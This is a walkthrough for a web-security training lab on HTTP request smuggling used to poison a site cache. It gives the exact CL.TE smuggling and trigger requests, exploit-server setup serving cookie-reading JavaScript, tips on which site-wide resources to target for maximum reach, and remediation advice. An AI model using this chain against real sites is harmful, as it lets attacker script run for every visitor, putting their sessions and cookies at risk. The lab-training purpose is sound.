# Lab 11: Exploiting HTTP request smuggling to perform web cache poisoning

**Category:** HTTP Request Smuggling
**Difficulty:** Practitioner
**Lab link:** [Exploiting HTTP request smuggling to perform web cache poisoning](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning)

## Overview

The lab's `/post/next?postId=N` endpoint builds a `302 Location:` using the request's `Host` header. Smuggle a request to that endpoint with `Host: exploit-server`, then immediately request `/resources/js/tracking.js`. The front-end pairs the smuggled 302 response with your tracking.js request and caches it under the tracking.js URL. Every subsequent visitor requesting tracking.js is now redirected to the exploit server, which serves `alert(document.cookie)` as JavaScript. One poisoning action → every user in the cache TTL window attacked.

## Key Concepts

- **Smuggling reroutes responses** across users. Combined with a cache in front, those misrouted responses become **persistent** attacks that affect everyone.
- **Host-header-reflected redirects** (`/post/next?postId=N` → `Location: https://<HOST_HEADER>/post?postId=M`) are the primitive. Any endpoint that reflects Host into a redirect, header, or body works.
- **Target a universally-loaded resource.** Poisoning `/resources/js/tracking.js` hits every page view; poisoning `/some-rare-endpoint` doesn't.
- **Steps 3 and 4 are time-sensitive** — the smuggle and the trigger request must land back-to-back on the same back-end connection.

## Burp Setup

- Repeater → Inspector → HTTP/1.
- Repeater menu → uncheck **Update Content-Length**.

## Solution

### Step 1 — Set up the exploit server

- **File:** `/post`
- **Content type:** `text/javascript`
- **Body:** `alert(document.cookie)`
- **Store.**

### Step 2 — Poisoning request (send once)

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 193
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: EXPLOIT-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

### Step 3 — Trigger request (immediately after)

```http
GET /resources/js/tracking.js HTTP/1.1
Host: LAB-ID.web-security-academy.net
Connection: close
```

Response should be the cached `302 Location: https://EXPLOIT-ID.exploit-server.net/post?postId=4` — cache poisoned.

### Step 4 — Confirm persistence

Send Step 3 a few more times. Every response should be the same 302. If so, wait for the admin to load any page → their browser pulls tracking.js → follows the redirect → executes `alert(document.cookie)` → lab solved.

## How the Chain Works

**Smuggle (Step 2):**
- Front-end (CL: 193): reads 193 bytes, forwards.
- Back-end (TE): stops at `0\r\n\r\n`. Parks the smuggled `GET /post/next?postId=3` with `Host: exploit-server` and `CL: 10`.

**Trigger (Step 3):** `GET /resources/js/tracking.js` arrives on the same back-end connection.
- Back-end has the parked smuggled GET waiting for 10 body bytes. Reads them from the start of the tracking.js request (consumes `GET /resourc`, 10 bytes).
- Back-end processes the smuggled `/post/next?postId=3` with `Host: exploit-server`, builds `302 Location: https://exploit-server/post?postId=4`.
- Back-end sends the 302 response.

**Front-end pairing:**
- Front-end had the tracking.js request pending in its response queue.
- The 302 comes back. Front-end pairs it with the tracking.js request.
- Front-end **caches the 302 as the response for `/resources/js/tracking.js`**.

**Victim:**
- Any client requests `/resources/js/tracking.js`.
- Cache serves the stored 302 → browser follows to exploit server → loads `/post` as JavaScript → `alert(document.cookie)` runs.

## Why `/post/next?postId=N` Is the Right Target

The endpoint's redirect is built from the Host header. Smuggling lets us set an arbitrary Host for a request the front-end never inspects. The response is a cacheable 302 — exactly the shape of response a cache will happily store.

Any endpoint with Host-header-reflected redirect behaviour is a cache-poisoning primitive via smuggling. Common wild examples:
- Trailing-slash redirects (`/admin` → `Location: https://host/admin/`)
- Protocol-upgrade redirects (`http://` → `https://`)
- Vanity-URL redirects (`/u/alice` → user profile URL)

## Why `/resources/js/tracking.js`

Static JS loaded on every page = universal attack surface. One poison hits every visitor. Other high-value cache keys:
- `/resources/css/*` loaded site-wide
- `/favicon.ico`
- Any `.js` referenced from the home page

## Why It Worked

- Host-header-controlled redirect primitive on the back-end.
- Front-end caches static resources without validating that the response was actually for that URL.
- Smuggling lets the attacker's crafted redirect be stored under *any* cache key by making the next client request (the tracking.js GET) the pairing target.

## Remediation

- **Validate Location responses before caching.** If the Location host isn't the same origin as the request, don't cache.
- **Never build redirect targets from `Host` or `X-Forwarded-Host` without strict allow-listing.**
- Reject requests with both `Content-Length` and `Transfer-Encoding`.
- Use HTTP/2 end-to-end.
- Short cache TTLs reduce blast radius if poisoning still happens.

## Python Script

[solve.py on GitHub](https://github.com/codingvedant/burpsuite-academy-labs/blob/main/request-smuggling/lab-11-web-cache-poisoning/solve.py)

Raw TLS sockets. Script sends smuggle + trigger back-to-back on one connection, then verifies the cache poisoning by requesting tracking.js and checking for the 302.

## Key Takeaways

- **Smuggling + caching = persistence.** One attack action, every subsequent visitor attacked for the cache TTL.
- **Host-header-reflected redirects** are the most common primitive — any endpoint that builds URLs from the Host header is a candidate.
- **Target a universally-loaded resource** (tracking JS, main CSS, favicon) for maximum impact.
- **The smuggle and trigger must land back-to-back** on the same back-end connection. Timing-sensitive — retry if first attempt doesn't poison.
- **Cache validation is the fix.** Caches should refuse to store responses whose Location points off-origin, or whose body doesn't match the expected content-type for the key.
